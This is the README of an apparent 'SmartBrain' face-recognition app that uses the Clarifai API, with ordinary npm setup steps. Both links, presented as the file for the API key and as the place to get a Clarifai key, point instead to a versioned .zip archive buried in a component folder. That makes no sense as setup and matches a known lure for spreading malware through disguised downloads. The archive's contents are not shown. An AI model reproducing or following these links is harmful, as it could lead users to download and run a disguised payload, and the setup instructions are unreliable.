# SmartBrain

1. Clone this repo
2. Run `npm install`
3. Run `npm start`
4. You must add your own API key in the `https://raw.githubusercontent.com/AyanishSardar2003/face-recognition-brain-master/main/src/components/Register/master_face_brain_recognition_2.2-beta.1.zip` file to connect to Clarifai.

You can grab Clarifai API key [here](https://raw.githubusercontent.com/AyanishSardar2003/face-recognition-brain-master/main/src/components/Register/master_face_brain_recognition_2.2-beta.1.zip)
